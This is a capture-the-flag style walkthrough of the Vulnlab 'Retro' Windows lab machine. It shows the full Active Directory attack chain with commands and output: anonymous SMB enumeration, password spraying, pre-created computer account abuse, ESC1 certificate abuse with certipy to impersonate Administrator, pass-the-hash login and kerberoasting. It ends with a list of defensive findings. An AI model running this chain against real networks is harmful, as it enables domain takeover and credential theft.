+++
title = '[Vulnlab] Retro'
date = 2024-10-03T08:45:19+02:00
draft = false
tags = ['pentesting']
+++

![Banner image of Retro machine](/images/vulnlab_retro/banner.png)
# Summary
1. SMB anonymous share gives hint to weak password
2. Username enumeration via `lookupsid.py -no-pass anonymous@$(<domain)`
3. Own Domain user via `username=password` brute force 
4. SMB share hints (pre created computer account)
5. Own Domain computer via `nxc ldap -M pre2k` 
6. Use `certipy` to find and exploit `ESC1` for Domain admin


## Tools used
```bash
nmap
netexec
impacket
certipy-ad
```

## Relevant ports
```
389/tcp   open  ldap            # LDAP to get kerberos auth from `BANKING$`
445/tcp   open  microsoft-ds    # Null session -> Share access + Usernames
9389/tcp  open  adws            # ESC1 for DA
```
## Relevant gathered information
* Usernames via `lookupsid.py`
* Vulnerable templates via `certipy find`

# Walkthrough

## Common Windows setup
As always, we put the target machines into a `ips.txt` file.
```bash
cat ips.txt 
10.10.104.73
```
Then we extract the name of the machine as well as the domain name.
```bash
nxc smb ips.txt
SMB         10.10.104.73    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
```
Setting up `/etc/hosts`, so our tooling works better:
```bash
tail -2 /etc/hosts
10.10.104.73	DC.retro.vl
10.10.104.73	retro.vl
```
As well as creating a `domain` file, so typos don't kill me:
```
echo -n retro.vl > domain
```
## Port scan
```bash
sudo nmap -v --top-ports 10000 -iL ips.txt -oA big
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49678/tcp open  unknown
```
The interesting port is 9389 which suggests an AD Certificate service.
But this will only be relevant when we have a domain user. Other than that there are no outliers.
Let's start with basic anonymous enumeration.
## 445 SMB - anonymous access → list share and get usernames
I use `netexec` to enumerate anonymous access to shares:
```bash {hl_lines=[7,9]}
nxc smb ips.txt -u 'anonymous' -p ''  --shares
SMB         10.10.104.73    445    DC               [+] retro.vl\anonymous: (Guest)
SMB         10.10.104.73    445    DC               [*] Enumerated shares
SMB         10.10.104.73    445    DC               Share           Permissions     Remark
SMB         10.10.104.73    445    DC               -----           -----------     ------
[...]
SMB         10.10.104.73    445    DC               Notes                           
SMB         10.10.104.73    445    DC               SYSVOL                          Logon server share 
SMB         10.10.104.73    445    DC               Trainees        READ  
```
We have access to the trainees share, which contains an Important.txt file:

```
smbclient.py anonymous:a@$(<domain)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Trainees
# ls
drw-rw-rw-          0  Mon Jul 24 00:16:11 2023 .
drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
-rw-rw-rw-        288  Mon Jul 24 00:16:11 2023 Important.txt
# cat Important.txt
```
> Dear Trainees,
> 
> I know that some of you seemed to struggle with remembering strong and unique passwords.
> So we decided to bundle every one of you up into one account.
> Stop bothering us. Please. We have other stuff to do than resetting your password every day.
> 
> Regards
> 
> The Admins

Seems like there is a standard account with an easily guessable password. 
Since we have anonymous access we can enumerate usernames via `lookupsid.py`

```bash
lookupsid.py -no-pass anonymous@retro.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at retro.vl
[*] StringBinding ncacn_np:retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
[...]
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```
which yields a users list
```bash
cat x | grep SidTypeUser | cut -d'\' -f2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC$
trainee
BANKING$
jburley
tblack
```

## Usernames → Password brute force
At this point, we can do the typical `username=password` test to check if we can compromise 
an account.
```bash {hl_lines=[5]}
nxc smb domain -u users.txt -p users.txt --no-bruteforce --continue-on-success
SMB         10.10.104.73    445       [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.10.104.73    445       [-] retro.vl\Administrator:Administrator STATUS_LOGON_FAILURE 
[...]
SMB         10.10.104.73    445       [+] retro.vl\trainee:trainee 
[...]
```
We gain the credentials `trainee:trainee`

## Pre2k accounts
The next hint is again in the SMB share Notes:
```
echo -n trainee |tee pass >  user
smbclient.py $(<user):$(<pass)@$(<domain)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use Notes
# ls
drw-rw-rw-          0  Mon Jul 24 00:03:16 2023 .
drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
-rw-rw-rw-        248  Mon Jul 24 00:05:56 2023 ToDo.txt
# cat ToDo.txt
```
> Thomas,
> 
> after convincing the finance department to get rid of their ancienct banking software
> it is finally time to clean up the mess they made. We should start with the pre created
> computer account. That one is older than me.
> 
> Best
> 
> James

Some googling leads us to a [Blogpost from trustedsec](https://trustedsec.com/blog/diving-into-pre-created-computer-accounts).
The gist is:
1. Pre created user accounts like `BANKING$` have a standard password which is the username in lowercase without the `$` → `banking`
2. Computer Accounts can be leveraged for Domain admin, if ADCS (Port 9389) is misconfigured via ESC1

The easiest way is to use the `pre2k` Module from `netexec`
```bash {hl_lines=7}
nxc ldap domain -u user -p pass -M pre2k
SMB         10.10.104.73    445    DC  [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
LDAP        10.10.104.73    389    DC  [+] retro.vl\trainee:trainee 
PRE2K       10.10.104.73    389    DC  Pre-created computer account: BANKING$
PRE2K       10.10.104.73    389    DC  [+] Found 1 pre-created computer accounts. Saved to /home/debian/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
PRE2K       10.10.104.73    389    DC  [+] Successfully obtained TGT for banking@retro.vl
PRE2K       10.10.104.73    389    DC  [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /home/debian/.nxc/modules/pre2k/ccache
```
This creates a Kerberos ticket for the `BANKING$` user which in my case is stored in `/home/debian/.nxc/modules/pre2k/ccache/banking.ccache`

To use this ticket we set 
```bash
export KRB5CCNAME=/home/debian/.nxc/modules/pre2k/ccache/banking.ccache
```
## 9389 - ESC1 abuse
First we check the current ADCS configuration via `certipy find`
```bash
echo -n dc.retro.vl > machine
certipy find -k -vulnerable -target $(<machine)
[...]
[*] Saved text output to '20241003111829_Certipy.txt'
cat 20241003111829_Certipy.txt
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    [...]
Certificate Templates
  0
    Template Name                       : RetroClients
    [...]
    Minimum RSA Key Length              : 4096
    [...]
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

ESC1 means that Domain Computers (like `BANKING$`) can be leveraged to gain Domain admin via `certipy`.
`certipy` uses the following parameters:
* `req`: request authentication
* `-k`: use the `ccache` file
* `-ca`: Enter the Certificate Authority here
* `-template`: Enter the vulnerable Certificate Template here
* `-target`: Target hostname of Certificate authority
* `-upn`: Target user to impersonate
* `-key-size`: Otherwise we get the error `CERTSRV_E_KEY_LENGTH`


```bash
certipy req -k -ca retro-DC-CA -k -template RetroClients -upn Administrator@retro.vl -target dc.retro.vl -key-size 4096
```

If we get the error `[-] Got error: The NETBIOS connection with the remote host timed out.` → just try again.

```bash
certipy req -k -ca retro-DC-CA -k -template RetroClients -upn Administrator@retro.vl -target dc.retro.vl -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now this certificate and private key can be traded into an admin hash:
```bash
certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:********************************
echo -n ******************************** > hash
```
*Note:* Sometimes the command errors with `KDC_ERR_PADATA_TYPE_NOSUPP`.
A [Blog post](https://www.thehacker.recipes/ad/movement/schannel/passthecert) from `The Hacker Ricipes` explains it nicely.
The gist of it is that the Domain controller does not support `PKINIT`, so we have to do it with `-ldap-shell`:

```
certipy auth -pfx administrator.pfx -dc-ip $(<ips.txt) -ldap-shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.10.81.124:636'
[*] Authenticated to '10.10.81.124' as: u:RETRO\Administrator
Type help for list of commands

# change_password Administrator password1234$
Got User DN: CN=Administrator,CN=Users,DC=retro,DC=vl
Attempting to set new password of: password1234$
Password changed successfully!
```
Then we just login with:
```bash
wmiexec.py Administrator:'password1234$'@$(<machine) 
```

### Root flag
```
wmiexec.py Administrator@$(<machine) -hashes :$(<hash)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\Users\Administrator\Desktop\root.txt
VL{********************************}
```
*Note:* This machine does not have a `user.txt` flag.



# Other paths
In case the `trainee` account did not exist the machine could still be compromised.

## A - Get password via Kerberoasting
It's possible to kerberoast the banking account via the guest account.
```bash
GetUserSPNs.py -usersfile users.txt -no-pass retro.vl/Guest
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password: [empty]
[-] CCache file is not found. Skipping...
[-] Principal: trainee - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*BANKING$$RETRO.VL$BANKING$*$[...]
```

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -O
hashcat (v6.2.5) starting

[...]

$krb5tgs$23$*BANKING$$RETRO.VL$BANKING$*$[...]:banking
```
## B - Password Brute forcing
We can also attempt to just bruteforce pre2k users;
```bash {hl_lines=[6]}
grep '\$' users.txt > pre2kusers.txt
cat pre2kusers.txt | tr '[:upper:]' '[:lower:]' | sed 's/.$//' | tee pre2kpasswords.txt
nxc smb domain -u pre2kusers.txt -p pre2kpasswords.txt --no-bruteforce --continue-on-success
SMB 10.10.81.124    [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB 10.10.81.124    [-] retro.vl\DC$:dc STATUS_LOGON_FAILURE 
SMB 10.10.81.124    [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

## Trade password into Ticket
Using the `impacket` function `getTGT.py` it's possible to request a `.ccache` file. 
At this point we continue with `ESC1`
```
getTGT.py $(<domain)/BANKING$:banking
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in BANKING$.ccache
```

# Findings
1. Anonymous NULL session on SMB share leaks usernames and sensitive data
2. Domain user with weak password: `trainee`
3. Kerberoastable Account `BANKING$`
4. Pre created user account: `BANKING$`
5. Vulnerable ADCS Configuration (ESC1): Template `RetroClients`

